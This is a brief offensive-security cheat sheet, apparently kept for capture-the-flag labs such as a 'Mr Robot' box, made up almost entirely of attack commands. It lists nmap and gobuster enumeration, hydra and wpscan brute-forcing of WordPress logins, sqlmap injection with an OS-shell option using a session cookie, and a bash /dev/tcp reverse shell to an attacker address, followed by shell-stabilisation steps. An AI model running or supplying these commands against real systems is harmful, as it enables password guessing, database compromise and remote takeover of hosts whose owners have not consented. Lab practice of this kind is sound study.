# We are going to do basic of Hacking

ip = 10.10.176.152

## Directory Hosting

python -m http.server 8888 --bind 0.0.0.0

## Enumeration

1. nmap -sC -sV -T100 10.10.176.152
2. nmap -sT <'ip address>
3. nmap -sP <'ip address>

1. gobuster dir -u 10.10.176.152 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

## BruteForcing

1. hydra -L fsocity.txt -p mypassword 10.10.186.250 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username"

2. hydra -l elliot -P fsocity.txt 10.10.186.250 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username"

3. wpscan --url <http://10.10.89.214> -t 50 -U elliot -P /home/kali/Documents/tryhackme/mr-robot/fsociety.txt

## Sqlmap

1. sqlmap -u '<http://10.129.233.138/dashboard.php?search=any+query>' --cookie="PHPSESSID=9qik8dt7ol8fpsbi63t0beft1l"
2. sqlmap -u '<http://10.129.233.138/dashboard.php?search=any+query>' --cookie="PHPSESSID=9qik8dt7ol8fpsbi63t0beft1l" --os-shell

## reverse shell

1. bash -c "bash -i >& /dev/tcp/10.10.14.161/443 0>&1"

pty enable
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl Z
stty raw -echo
fg
export TERM=xterm
